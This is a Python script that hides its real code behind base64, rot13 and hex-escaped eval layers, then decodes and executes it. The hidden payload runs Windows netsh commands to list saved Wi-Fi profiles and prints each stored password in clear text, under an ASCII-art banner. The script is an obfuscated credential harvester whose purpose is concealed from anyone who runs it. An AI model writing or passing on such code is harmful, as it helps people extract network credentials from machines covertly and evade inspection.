import base64, codecs
magic = 'YmlibGFjaz0iXDAzM1sxOzkwbSIgICAgICAjIEJsYWNrCmJpcmVkPSJcMDMzWzE7OTFtIiAgICAgICAgIyBSZWQKYmlncmVlbj0iXDAzM1sxOzkybSIgICAgICAjIEdyZWVuCmJpeWVsbG93PSJcMDMzWzE7OTNtIiAgICAgIyBZZWxsb3cKYmlibHVlPSJcMDMzWzE7OTRtIiAgICAgICAjIEJsdWUKYmlwdXJwbGU9IlwwMzNbMTs5NW0iICAgICAjIFB1cnBsZQpiaWN5YW49IlwwMzNbMTs5Nm0iICAgICAgICMgQ3lhbgpiaWVoaXRlPSJcMDMzWzE7OTdtIiAgICAgICMgV2hpdGUKCm9zLnN5c3RlbSgiY2xlYXIiKQoKCnByaW50KGJpZ3JlZW4rIiIiCiAgIF9fXyBfICAgICAgICAgICAgICAgICAgICAgIF8gICAgICAgICAgIF8KICAvIF9fXCB8X18gICBfXyBfIF8gX18gICBfX198IHxfXyAgIF9fIF98IHwKIC8gLyAgfCAnXyBcIC8gX2AgfCAnXyBcIC8gX198ICdfIFwgLyBfYCB8IHwKLyAvX19ffCB8IHwgfCAoX3wgfCB8IHwgfCAoX198IHwgfCB8IChffCB8IHwKXF9fX18vfF98IHxffFxfXyxffF98IHxffFxfX198X3wgfF98'
love = 'KS9sYS98K3jXPhXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxNbtIT9ioUZtGzSgMFN6VSqWExxtHRSGHlOGFR9KPvOOqKEbo3VtBvOQFRSBD0uOGPOWH0kOGDbtD29hqTSwqPN6YFOfnJ5eqUVhMJHiqUIhqUIhnJuurT9lPhXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxBXIxNbXVvVvXDbXPtccoKOipaDtp3IvpUWiL2ImpjccoKOipaDtpzHXPtcwo21gLJ5xK291qUO1qPN9VUA1LaOlo2Ayp3ZhpaIhXSfvozI0p2tvYPNvq2kuovVfVPWmnT93VvjtVaOlo2McoTImVy0fVTAupUE1pzIso3I0pUI0VQ0tIUW1MFxhp3Exo3I0YzEy'
god = 'Y29kZSgpCgpwcm9maWxlX25hbWVzID0gKHJlLmZpbmRhbGwoIkFsbCBVc2VyIFByb2ZpbGUgICAgIDogKC4qKVxyIiwgY29tbWFuZF9vdXRwdXQpKQoKd2lmaV9saXN0ID0gW10KCmlmIGxlbihwcm9maWxlX25hbWVzKSAhPSAwOgogICAgZm9yIG5hbWUgaW4gcHJvZmlsZV9uYW1lczoKICAgICAgICAKICAgICAgICB3aWZpX3Byb2ZpbGUgPSB7fQogICAgICAgIAogICAgICAgIHByb2ZpbGVfaW5mbyA9IHN1YnByb2Nlc3MucnVuKFsibmV0c2giLCAid2xhbiIsICJzaG93IiwgInByb2ZpbGUiLCBuYW1lXSwgY2FwdHVyZV9vdXRwdXQgPSBUcnVlKS5zdGRvdXQuZGVjb2RlKCkKICAgICAgICAKICAgICAgICBpZiByZS5zZWFyY2goIlNlY3VyaXR5IGtleSAgICAgICAgICAgOiBBYnNlbnQiLCBwcm9maWxlX2luZm8pOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIAogICAgICAgICAgICB3aWZpX3Byb2ZpbGVbInNzaWQiXSA9IG5hbWUKICAgICAgICAgICAgCiAgICAgICAgICAgIHByb2Zp'
destiny = 'oTIsnJ5zo19jLKAmVQ0tp3IvpUWiL2Impl5lqJ4bJlWhMKEmnPVfVPW3oTShVvjtVaAbo3pvYPNvpUWiMzyfMFVfVT5uoJHfVPWeMKx9L2kyLKVvKFjtL2SjqUIlMI9iqKEjqKDtCFOHpaIyXF5mqTEiqKDhMTIwo2EyXPxXVPNtVPNtVPNtVPNtPvNtVPNtVPNtVPNtVUOup3A3o3WxVQ0tpzHhp2IupzAbXPWYMKxtD29hqTIhqPNtVPNtVPNtVPNtVQbtXP4dXIklVvjtpUWiMzyfMI9cozMiK3Oup3ZcPvNtVPNtVPNtVPNtVNbtVPNtVPNtVPNtVPOcMvOjLKAmq29lMPN9CFOBo25yBtbtVPNtVPNtVPNtVPNtVPNtq2yznI9jpz9znJkyJlWjLKAmq29lMPWqVQ0tGz9hMDbtVPNtVPNtVPNtVPOyoUAyBtbtVPNtVPNtVPNtVPNtVPNXVPNtVPNtVPNtVPNtVPNtVUqcMzyspUWiMzyfMIfvpTSmp3qipzDvKFN9VUOup3A3o3WxJmSqPvNtVPNtVPNtVPNtVNbtVPNtVPNtVPNtVPO3nJMcK2kcp3DhLKOjMJ5xXUqcMzyspUWiMzyfMFxtPtczo3VtrPOcovOlLJ5aMFufMJ4bq2yznI9fnKA0XFx6PvNtVPOjpzyhqPu3nJMcK2kcp3EorS0cVNb='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))